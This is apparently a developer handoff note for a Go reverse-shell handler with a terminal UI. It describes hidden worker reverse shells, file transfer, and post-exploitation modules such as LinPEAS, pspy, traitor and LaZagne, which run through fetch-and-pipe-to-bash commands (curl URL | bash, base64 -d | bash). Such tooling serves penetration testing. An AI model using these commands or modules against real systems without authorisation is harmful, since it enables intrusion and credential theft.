# TUI Current Status — 2026-04-03 (Late Session)

## What's Done

### Core TUI
- Bubble Tea TUI with 3-tier responsive layout (Full/Medium/Compact)
- F11 sidebar toggle, F12 attach/detach toggle
- Per-session output buffers and command history
- Shell relay with PTY upgrade, SIGWINCH resize
- Mouse text selection, clipboard, scrollbar, notification bar, spinner
- Quit confirmation, ANSI-aware rendering
- Persistent menu history, session auto-select
- Exit banner with session log path
- Compact attach/detach messages (dedicated icons)

### Transfers
- Async fire-and-forget via `transferDoneFunc` callback
- Status bar progress overlay (hatching `/` for uploads, size counter for downloads)
- SmartUpload (HTTP binbag → b64 fallback), SmartDownload (HTTP POST → b64 fallback)
- Stop/restart relay + stty -echo + 1KB chunks for PTY shells
- Tilde expansion, Ctrl+C cancel, Enter/F12 blocked during transfer

### Bang Mode (`!` prefix in shell)
- `!upload`, `!download`, `!spawn`, `!kill`, `!run` from shell context
- Tab completion, menu history, contextual placeholder

### Spawn
- Async with TUI spinner, payload echo suppressed via dual-mode relay suppression

### Binbag + Pivot + Config
- `binbag ls/on/off/path/port`, auto-persist, upload path fallback CWD → binbag
- `pivot <ip>` / `pivot off` — IP-only, affects all URLs/payloads
- Tab completion merges CWD + binbag files

### Module System — CURRENT WORK (Critical)

**Architecture (Penelope-inspired worker session model):**

The module system spawns an invisible "worker session" to execute modules. This keeps the main session 100% free for shell interaction, uploads, spawns, etc.

**Flow:**
1. `run <module>` → spinner "Spawning worker shell for <module>..."
2. Gummy sends spawn payload from main session (suppressed from viewport)
3. `pendingWorker` atomic flag marks the next `AddSession` as a worker
4. Worker session connects — completely invisible:
   - Not shown in list/sidebar/session count
   - No "reverse shell received" notification
   - No detection spinner, stdout/stderr suppressed during detection
   - No "session closed" notification when removed
5. Module executes on worker via `RunScriptInMemory` (now BLOCKING):
   - HTTP binbag: `curl -s URL | bash -s -- args`
   - B64 fallback: upload to variable → `echo "$var" | base64 -d | bash -s -- args`
   - `ExecuteWithStreamingCtx` captures output to local file
   - Terminal window opens with `tail -f` of local output file
   - Done marker (`__GUMMY_DONE_*__`) filtered from output file
6. Spinner stops immediately after setup — user can continue working
7. When script finishes, notification appears in viewport + notification bar
8. Worker session lives until script completes (natural cleanup)

**Key files:**
- `session.go:StartModule()` — orchestrates spawn → wait → run → notify
- `session.go:RunScriptInMemory()` — resolves source, builds command, calls ExecuteWithStreamingCtx (BLOCKING)
- `session.go:AddSession()` — checks `pendingWorker` flag, suppresses notifications for workers
- `session.go:RemoveSession()` — suppresses disconnect notifications for workers
- `shell.go:ExecuteWithStreamingCtx()` — reads conn, writes to file, filters markers
- `modules.go` — module registry and implementations

**Tested modules:**
- [x] `peas` — LinPEAS (HTTP binbag, in-memory) ✅
- [x] `lse` — Linux Smart Enumeration (HTTP binbag, in-memory, args with `--`) ✅
- [ ] `loot` — ezpz post-exploitation (same pattern as peas/lse, needs testing)
- [ ] `pspy` — process monitor (RunBinary, disk+cleanup, needs testing)
- [ ] `traitor` — auto privesc (RunBinary, disk+cleanup, needs testing)

**Untested modules (need TUI integration):**
- [ ] `winpeas` — WinPEAS (.NET in-memory) — Windows only
- [ ] `seatbelt` — Seatbelt (.NET in-memory) — Windows only
- [ ] `lazagne` — LaZagne (binary, disk+cleanup) — Windows only
- [ ] `sh` — arbitrary bash script from URL
- [ ] `ps1` — arbitrary PowerShell script
- [ ] `dotnet` — arbitrary .NET assembly
- [ ] `py` — arbitrary Python script
- [ ] `bin` — arbitrary binary

**Known issues / TODOs for next session:**
1. `RunBinary` (used by pspy, traitor, lazagne, bin) — needs same refactoring as RunScriptInMemory:
   - Must be BLOCKING (not launch internal goroutine)
   - Must use ExecuteWithStreamingCtx
   - Must work with worker session model
2. `RunPowerShellInMemory`, `RunDotNetInMemory`, `RunPythonInMemory` — same refactoring needed
3. Dead code audit: check for unused functions after refactoring (like the removed RunScript)
4. The `-- args` separator fix was done in RunScriptInMemory but may need checking in other Run* functions

## Dead Code Warning

After extensive refactoring, there may be dead code. Before proceeding, the next agent should:
1. `grep -n 'func.*SessionInfo.*Run' internal/session.go` — list all Run* methods
2. Check each one is actually called from modules.go
3. Check `ExecuteWithStreaming` (non-Ctx version) — may be unused now
4. Check `moduleCancel` field on SessionInfo — may be unused after removing internal goroutines
5. Check `WatchForCancel` — was for CLI mode cancel, may not be used in TUI
6. Check old StartShellRelay Ctrl+C/drain code — was for module cleanup, may be stale

## Architecture Decisions

### Why Worker Sessions (Penelope Model)
- Single TCP connection cannot be shared between module output streaming and shell interaction
- Penelope solves this with "control sessions" — separate connections for command execution
- Gummy spawns a reverse shell from the main session, uses it exclusively for the module
- Main session stays 100% free — shell, spawn, upload, download all work normally

### Why BLOCKING RunScriptInMemory
- Previously launched internal goroutines — caller couldn't know when module finished
- Now the caller (StartModule goroutine) blocks until ExecuteWithStreamingCtx returns
- Clean lifecycle: spawn → detect → run (blocking) → notify → cleanup

### Why No Spinner During Execution
- Spinner blocks Enter key (by design — prevents concurrent operations)
- Module execution takes minutes — blocking input defeats the purpose of worker sessions
- Instead: spinner during setup only (~5-10s), then fire-and-forget

## What's Next

### Immediate: Complete Linux Module Testing
1. Test `run loot` (same pattern as peas/lse)
2. Refactor `RunBinary` for worker model (pspy, traitor)
3. Test `run pspy`, `run traitor`
4. Test custom modules: `run sh <url>`, `run bin <url>`

### Then: Dead Code Cleanup
1. Remove unused Run* methods
2. Remove unused fields (moduleCancel if unused)
3. Remove ExecuteWithStreaming if only Ctx version is used

### Then: Other Priorities
1. Per-command help (TUI modal)
2. Windows testing
3. Upload/download test matrix

## Important Notes for Handoff

- **Build the binary**: always `go build -o gummy .` before testing
- **UI consistency**: always use `ui/colors.go` helpers, never raw styles
- **p.Send deadlock**: ALL callbacks MUST use `go p.Send(...)`
- **PTY transfers**: stop relay + stty -echo + 1KB chunks when relay was active
- **Worker sessions**: invisible, use `pendingWorker` atomic flag, suppress all notifications
- **Module args**: use `-- args` separator (not just `args`) to avoid bash option conflicts
- **Module output**: ExecuteWithStreamingCtx filters done markers from local file
- **Two-computer workflow**: handoff context must be in docs/

## File Map

```
internal/
├── session.go      # Manager, commands, StartModule, RunScriptInMemory, worker sessions (~3200 LOC)
├── shell.go        # Handler, ExecuteWithStreaming/Ctx, PTY modes
├── modules.go      # Module registry: peas, lse, loot, pspy, traitor, winpeas, seatbelt, lazagne, bin, sh, ps1, dotnet, py
├── transfer.go     # SmartUpload/SmartDownload, HTTP + b64
├── fileserver.go   # HTTP server (GET=serve, POST=receive)
├── config.go       # TOML config
├── runtime_config.go # Auto-persist, pivot, binbag management
├── payloads.go     # Reverse shell generators (used by spawn + module worker)
├── listener.go     # TCP listener
├── pty.go          # PTY upgrade
├── ssh.go          # SSH + auto revshell
├── netutil.go      # Network utilities
├── downloader.go   # HTTP file downloader
├── terminal.go     # Terminal window opener
└── ui/colors.go    # UI helpers, symbols, color functions

internal/tui/
├── app.go          # Root model, relay, buffers, bang mode, transfers, spawn, modules, kill
├── input.go        # Text input, bang mode, persistent history
├── outputpane.go   # Viewport, spinner
├── statusbar.go    # Hints, notifications, progress bar
├── layout.go       # 3-tier layout + F11 toggle
├── messages.go     # All tea.Msg types
├── styles.go       # Colors
├── logo.go         # Banner + exit banner
├── header.go       # Compact header
├── selection.go    # Mouse selection
├── clipboard.go    # OSC 52 + native
├── focus.go        # FocusMode
└── dialog.go       # Modal dialogs
```

## Branch: `tui` (based on `main`)
